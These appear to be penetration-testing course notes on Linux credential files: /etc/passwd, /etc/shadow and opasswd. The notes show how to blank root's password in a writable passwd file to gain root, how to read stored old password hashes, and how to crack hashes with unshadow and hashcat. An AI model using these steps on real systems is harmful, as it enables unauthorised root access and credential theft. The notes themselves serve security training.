### Passwd File
The `/etc/passwd` file contains information about every existing user on the system and can be read by all users and services. Each entry in the `/etc/passwd` file identifies a user on the system.

|`cry0l1t3`|`:`|`x`|`:`|`1000`|`:`|`1000`|`:`|`cry0l1t3,,,`|`:`|`/home/cry0l1t3`|`:`|`/bin/bash`|
|---|---|---|---|---|---|---|---|---|---|---|---|---|
|Login name||Password info||UID||GUID||Full name/comments||Home directory||Shell|

One of the rarest cases that we may find only on very old systems is the hash of the encrypted password in this field.

#### Exploiting /etc/passwd
Usually, we find the value `x` in this field, which means that the passwords are stored in an encrypted form in the `/etc/shadow` file. However, it can also be that the `/etc/passwd` file is writeable by mistake. This would allow us to clear this field for the user `root` so that the password info field is empty. 

Before
```shell
root:x:0:0:root:/root:/bin/bash
```
After
```shell
root::0:0:root:/root:/bin/bash
```
Login as root
```bash
su root
```

### Shadow File
`/etc/shadow` contains all the password information for the created users.

|`cry0l1t3`|`:`|`$6$wBRzy$...SNIP...x9cDWUxW1`|`:`|`18937`|`:`|`0`|`:`|`99999`|`:`|`7`|`:`|`:`|`:`|
|---|---|---|---|---|---|---|---|---|---|---|---|---|---|
|Username||Encrypted password||Last PW change||Min. PW age||Max. PW age||Warning period|Inactivity period|Expiration date|Unused|

`$<type>$<salt>$<hashed>`

- `$1$` – MD5
- `$2a$` – Blowfish
- `$2y$` – Eksblowfish
- `$5$` – SHA-256
- `$6$` – SHA-512

If this is readable we can take it offline and crack it
```bash
hashcat -m 1800 root.hash ~/rockyou.txt -O
```

### Opasswd
The PAM library (`pam_unix.so`) can prevent reusing old passwords. The file where old passwords are stored is the `/etc/security/opasswd`. Administrator/root permissions are also required to read the file if the permissions for this file have not been changed manually.

```bash
adot8@htb[/htb]$ sudo cat /etc/security/opasswd

cry0l1t3:1000:2:$1$HjFAfYTG$qNDkF0zJ3v8ylCOrKB0kt0,$1$kcUjWZJX$E9uMSmiQeRh4pAAgzuvkq1
```

The `MD5` (`$1$`) algorithm is much easier to crack than SHA-512. This is especially important for identifying old passwords and maybe even their pattern because they are often used across several services or applications.
### Unshadow
```bash
unshadow passwd.bak shadow.bak > unshadow.hashes

hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o unshadow.cracked
```

```bash
hashcat -m 500 -a 0 md5.hashes ~/rockyou.txt
```